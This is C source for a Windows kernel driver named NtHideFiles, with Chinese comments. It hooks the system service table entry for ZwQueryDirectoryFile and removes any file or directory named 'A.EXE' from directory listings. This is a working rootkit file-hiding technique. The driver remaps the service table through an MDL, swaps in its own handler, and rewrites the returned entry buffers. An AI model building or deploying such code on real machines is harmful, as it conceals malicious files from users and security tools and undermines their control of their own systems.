#include <ntddk.h>

#define FILE_DEVICE_NTHIDEFILES    0x8000
#define NTHIDEFILES_IOCTL_BASE    0x800

#define CTL_CODE_NTHIDEFILES(i) CTL_CODE(FILE_DEVICE_NTHIDEFILES, NTHIDEFILES_IOCTL_BASE+i, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_NTHIDEFILES_HELLO    CTL_CODE_NTHIDEFILES(0)

#define NTHIDEFILES_DEVICE_NAME     L"\\Device\\NtHideFiles"
#define NTHIDEFILES_DOS_DEVICE_NAME L"\\DosDevices\\NtHideFiles"

#define dprintf if (DBG) DbgPrint
#define nprintf DbgPrint

typedef struct _DEVICE_EXTENSION
{
    ULONG StateVariable;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

typedef struct _FILE_BOTH_DIR_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

#pragma pack(1)
typedef struct _SERVICE_DESCRIPTOR_ENTRY
{
    unsigned int * ServiceTableBase;
    unsigned int * ServiceCounterTableBase;
    unsigned int NumberOfServices;
    unsigned char * ParamTableBase;
} SERVICE_DESCRIPTOR_ENTRY, *PSERVICE_DESCRIPTOR_ENTRY;
#pragma pack()

// ZwQueryDirectoryFile 的原型
typedef NTSTATUS (NTAPI *PFN_ZwQueryDirectoryFile)(
    IN HANDLE hFile,
    IN HANDLE hEvent OPTIONAL,
    IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
    IN PVOID IoApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK pIoStatusBlock,
    OUT PVOID FileInformationBuffer,
    IN ULONG FileInformationBufferLength,
    IN FILE_INFORMATION_CLASS FileInfoClass,
    IN BOOLEAN bReturnOnlyOneEntry,
    IN PUNICODE_STRING PathMask OPTIONAL,
    IN BOOLEAN bRestartQuery);
extern "C" 
{ 
NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
    IN HANDLE hFile,
    IN HANDLE hEvent OPTIONAL,
    IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
    IN PVOID IoApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK pIoStatusBlock,
    OUT PVOID FileInformationBuffer,
    IN ULONG FileInformationBufferLength,
    IN FILE_INFORMATION_CLASS FileInfoClass,
    IN BOOLEAN bReturnOnlyOneEntry,
    IN PUNICODE_STRING PathMask OPTIONAL,
    IN BOOLEAN bRestartQuery);
}

NTSTATUS HookZwQueryDirectoryFile(
    IN HANDLE hFile,
    IN HANDLE hEvent OPTIONAL,
    IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
    IN PVOID IoApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK pIoStatusBlock,
    OUT PVOID FileInformationBuffer,
    IN ULONG FileInformationBufferLength,
    IN FILE_INFORMATION_CLASS FileInfoClass,
    IN BOOLEAN bReturnOnlyOneEntry,
    IN PUNICODE_STRING PathMask OPTIONAL,
    IN BOOLEAN bRestartQuery);
extern "C"{
__declspec(dllimport) SERVICE_DESCRIPTOR_ENTRY KeServiceDescriptorTable;
}

// 保存原 ZwQueryDirectoryFile 函数指针
PFN_ZwQueryDirectoryFile OriginalZwQueryDirectoryFile = NULL;

PMDL g_pmdlSystemCall = NULL;
PVOID *MappedSystemCallTable = NULL;
BOOLEAN g_bHooked = FALSE;

#define SYSCALL_INDEX(_Function)              *(PULONG)((PUCHAR)_Function + 1)
#define SYSTEMSERVICE(_Function)              KeServiceDescriptorTable.ServiceTableBase[SYSCALL_INDEX(_Function)]
#define HOOK_SYSCALL(_Function, _Hook, _Orig)  _Orig= (PFN_ZwQueryDirectoryFile)InterlockedExchange((PLONG)&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG)_Hook)
#define UNHOOK_SYSCALL(_Function, _Orig)      InterlockedExchange((PLONG)&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG)_Orig)
extern "C" {
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath);
NTSTATUS DispatchCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS DispatchClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
VOID DriverUnload(IN PDRIVER_OBJECT DriverObject);
PCWSTR GetProcessFullName();
}
#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, DispatchCreate)
#pragma alloc_text(PAGE, DispatchClose)
#pragma alloc_text(PAGE, DispatchDeviceControl)
#pragma alloc_text(PAGE, DriverUnload)
#endif

#define BASE_PROCESS_PEB_OFFSET                   0x1B0
#define BASE_PEB_PROCESS_PARAMETER_OFFSET         0x010
#define BASE_PROCESS_PARAMETER_FULL_IMAGE_NAME    0x03C
#define W2003_BASE_PROCESS_PEB_OFFSET             0x190
#define W2003_BASE_PROCESS_PEB_OFFSET_SP1         0x1A0
#define W2003_BASE_PROCESS_PEB_OFFSET_SP2         W2003_BASE_PROCESS_PEB_OFFSET_SP1
#define VISTA_BASE_PROCESS_PEB_OFFSET             0x188

PCWSTR GetProcessFullName()
{
    NTSTATUS status    = -1;
    ULONG    dwAddress = 0;
    PCWSTR   lpszTemp  = NULL;
    RTL_OSVERSIONINFOEXW osVerInfo;

    dwAddress = (ULONG)PsGetCurrentProcess();
    if (dwAddress == 0 || dwAddress == (ULONG)-1)
        return NULL;

    RtlZeroMemory(&osVerInfo, sizeof(RTL_OSVERSIONINFOEXW));
    osVerInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);

    status = RtlGetVersion((PRTL_OSVERSIONINFOW)&osVerInfo);
    if (!NT_SUCCESS(status))
        return NULL;

    // 目前只支持 Windows 2000/XP/2003/Vista
    if (osVerInfo.dwMajorVersion < 5 || osVerInfo.dwMinorVersion > 2)
        return NULL;

    // 取得PEB，不同平台的位置是不同的
    if (osVerInfo.dwMajorVersion == 5)
    {
        if (osVerInfo.dwMinorVersion < 2)    // 2000   0X0500       XP 0X0501
        {
            dwAddress += BASE_PROCESS_PEB_OFFSET;
        }
        else if (osVerInfo.dwMinorVersion == 2)    // 2003   0X0502
        {
            if (osVerInfo.wServicePackMajor == 0)    // No Service Pack
                dwAddress += W2003_BASE_PROCESS_PEB_OFFSET;
            else if (osVerInfo.wServicePackMajor < 3)    // Service Pack 1 & 2
                dwAddress += W2003_BASE_PROCESS_PEB_OFFSET_SP1;
        }
    }
    else    // Vista   0X0600
    {
        dwAddress += VISTA_BASE_PROCESS_PEB_OFFSET;
    }

    if ((dwAddress = *(PULONG)dwAddress) == 0)
        return NULL;

    // 通过PEB取得RTL_USER_PROCESS_PARAMETERS
    dwAddress += BASE_PEB_PROCESS_PARAMETER_OFFSET;
    if ((dwAddress = *(PULONG)dwAddress) == 0)
        return NULL;

    // 在RTL_USER_PROCESS_PARAMETERS->ImagePathName保存了路径，偏移为0x038
    dwAddress += BASE_PROCESS_PARAMETER_FULL_IMAGE_NAME;
    if ((dwAddress = *(PULONG)dwAddress) == 0)
        return NULL;

    // [10/14/2006]
    lpszTemp = (PCWSTR)dwAddress;
    if (wcslen(lpszTemp) > 4)
    {
        if (lpszTemp[0] == L'\\' && 
            (lpszTemp[1] == L'?' || lpszTemp[1] == L'\\') && 
            lpszTemp[2] == L'?' && 
            lpszTemp[3] == L'\\')
        {
            dwAddress += 4 * sizeof(WCHAR);
        }
    }

    return (PCWSTR)dwAddress;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    NTSTATUS       status = STATUS_SUCCESS;
    UNICODE_STRING ntDeviceName;
    UNICODE_STRING dosDeviceName;
    PDEVICE_OBJECT deviceObject = NULL;
    BOOLEAN        fSymbolicLink = FALSE;

    dprintf("[NtHideFiles] DriverEntry: %wZ\n", RegistryPath);

    RtlInitUnicodeString(&ntDeviceName, NTHIDEFILES_DEVICE_NAME);

    status = IoCreateDevice(
        DriverObject,
        sizeof(DEVICE_EXTENSION),    // DeviceExtensionSize
        &ntDeviceName,                // DeviceName
        FILE_DEVICE_NTHIDEFILES,    // DeviceType
        0,                            // DeviceCharacteristics
        TRUE,                        // Exclusive
        &deviceObject                // [OUT]
        );

    if (!NT_SUCCESS(status))
        goto __failed;

    RtlInitUnicodeString(&dosDeviceName, NTHIDEFILES_DOS_DEVICE_NAME);

    status = IoCreateSymbolicLink(&dosDeviceName, &ntDeviceName);

    if (!NT_SUCCESS(status))
        goto __failed;

    fSymbolicLink = TRUE;

    DriverObject->MajorFunction[IRP_MJ_CREATE]         = DispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = DispatchClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
    DriverObject->DriverUnload                         = DriverUnload;

    // Map the memory into our domain to change the permissions on the MDL
    g_pmdlSystemCall = IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, 
        KeServiceDescriptorTable.NumberOfServices * 4, 
        FALSE, FALSE, NULL);

    if (g_pmdlSystemCall == NULL)
    {
        status = STATUS_UNSUCCESSFUL;
        goto __failed;
    }

    MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
    // Change the flags of the MDL
    g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
    MappedSystemCallTable = (PVOID *)MmMapLockedPages(g_pmdlSystemCall, KernelMode);

    // HOOK ZwQueryDirectoryFile 并保存原 ZwQueryDirectoryFile 函数地址
    HOOK_SYSCALL(ZwQueryDirectoryFile, HookZwQueryDirectoryFile, OriginalZwQueryDirectoryFile);
    g_bHooked = TRUE;

    if (NT_SUCCESS(status))
        return status;

__failed:

    if (fSymbolicLink)
        IoDeleteSymbolicLink(&dosDeviceName);

    if (deviceObject)
        IoDeleteDevice(deviceObject);

    return status;
}

NTSTATUS DispatchCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    Irp->IoStatus.Information = 0;

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

NTSTATUS DispatchClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    Irp->IoStatus.Information = 0;

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    NTSTATUS           status = STATUS_SUCCESS;
    PIO_STACK_LOCATION irpStack;
    PVOID              ioBuf;
    ULONG              inBufLength, outBufLength;
    ULONG              ioControlCode;

    irpStack = IoGetCurrentIrpStackLocation(Irp);

    Irp->IoStatus.Information = 0;

    //
    // Get the pointer to the input/output buffer and it's length
    //

    ioBuf = Irp->AssociatedIrp.SystemBuffer;
    inBufLength = irpStack->Parameters.DeviceIoControl.InputBufferLength;
    outBufLength = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
    ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

    switch (ioControlCode)
    {
    case IOCTL_NTHIDEFILES_HELLO:
        break;
    default:
        status = STATUS_INVALID_PARAMETER;
        break;
    }

    //
    // DON'T get cute and try to use the status field of
    // the irp in the return status.  That IRP IS GONE as
    // soon as you call IoCompleteRequest.
    //

    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    //
    // We never have pending operation so always return the status code.
    //

    return status;
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING dosDeviceName;

    // UnHook ZwQueryDirectoryFile
    if (g_bHooked && OriginalZwQueryDirectoryFile != NULL)
        UNHOOK_SYSCALL(ZwQueryDirectoryFile, OriginalZwQueryDirectoryFile);

    if (g_pmdlSystemCall != NULL)
    {
        MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
        IoFreeMdl(g_pmdlSystemCall);
    }

    //
    // Delete the symbolic link
    //

    RtlInitUnicodeString(&dosDeviceName, NTHIDEFILES_DOS_DEVICE_NAME);

    IoDeleteSymbolicLink(&dosDeviceName);

    //
    // Delete the device object
    //

    IoDeleteDevice(DriverObject->DeviceObject);

    dprintf("[NtHideFiles] unloaded\n");
}

NTSTATUS HookZwQueryDirectoryFile(
    IN HANDLE hFile,
    IN HANDLE hEvent OPTIONAL,
    IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
    IN PVOID IoApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK pIoStatusBlock,
    OUT PVOID FileInformationBuffer,
    IN ULONG FileInformationBufferLength,
    IN FILE_INFORMATION_CLASS FileInfoClass,
    IN BOOLEAN bReturnOnlyOneEntry,
    IN PUNICODE_STRING PathMask OPTIONAL,
    IN BOOLEAN bRestartQuery)
{
    NTSTATUS rc = STATUS_SUCCESS;
    ANSI_STRING ansiFileName, ansiDirName, HideDirFile;
    UNICODE_STRING uniFileName;
    PCWSTR pProcPath = NULL;

    // 初始化要过虑的文件名，大写形式
    RtlInitAnsiString(&HideDirFile, "A.EXE");

    pProcPath = GetProcessFullName();
    DbgPrint("[NtHideFiles] GetProcessFullName: %ws\n", pProcPath == NULL ? L"<null>" : pProcPath);

    // 执行真正的 ZwQueryDirectoryFile 函数
    rc = OriginalZwQueryDirectoryFile(
        hFile, 
        hEvent, 
        IoApcRoutine,
        IoApcContext,
        pIoStatusBlock,
        FileInformationBuffer,
        FileInformationBufferLength,
        FileInfoClass,
        bReturnOnlyOneEntry,
        PathMask,
        bRestartQuery);

    // 如果执行成功，而且 FILE_INFORMATION_CLASS 的值为 FileBothDirectoryInformation，我们就进行处理，过滤
    if (NT_SUCCESS(rc) && FileInfoClass == FileBothDirectoryInformation)
    {
        // 把执行结果赋给 pFileInfo
        PFILE_BOTH_DIR_INFORMATION pFileInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer;
        PFILE_BOTH_DIR_INFORMATION pLastFileInfo = NULL;
        BOOLEAN bLastOne = FALSE;
        
        // 循环检查
        do
        {
            bLastOne = !pFileInfo->NextEntryOffset;
            RtlInitUnicodeString(&uniFileName, pFileInfo->FileName);
            RtlUnicodeStringToAnsiString(&ansiFileName, &uniFileName, TRUE);
            RtlUnicodeStringToAnsiString(&ansiDirName, &uniFileName, TRUE);
            RtlUpperString(&ansiFileName, &ansiDirName);
            
            // 打印结果，用 debugview 可以查看打印结果
            //dprintf("ansiFileName :%s\n", ansiFileName.Buffer);
            //dprintf("HideDirFile :%s\n", HideDirFile.Buffer);
            
            // 开始进行比较，如果找到了就隐藏这个文件或者目录
            if (RtlCompareMemory(ansiFileName.Buffer, HideDirFile.Buffer, HideDirFile.Length) == HideDirFile.Length)
            {
                dprintf("This is HideDirFile!\n");

                if (bLastOne)
                {
                    if (pFileInfo == (PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)
                        rc = STATUS_NO_MORE_FILES;    // 隐藏文件或者目录；
                    else
                        pLastFileInfo->NextEntryOffset = 0;

                    break;
                }
                else    // 指针往后移动
                {
                    int iPos = (ULONG)pFileInfo - (ULONG)FileInformationBuffer;
                    int iLeft = (ULONG)FileInformationBufferLength - iPos - pFileInfo->NextEntryOffset;
                    RtlCopyMemory((PVOID)pFileInfo, (PVOID)((PCHAR)pFileInfo + pFileInfo->NextEntryOffset), (ULONG)iLeft);
                    continue;
                }
            }
            
            pLastFileInfo = pFileInfo;
            pFileInfo = (PFILE_BOTH_DIR_INFORMATION)((PCHAR)pFileInfo + pFileInfo->NextEntryOffset);
        } while (!bLastOne);
        
        RtlFreeAnsiString(&ansiDirName);
        RtlFreeAnsiString(&ansiFileName);
    }

    return rc;
}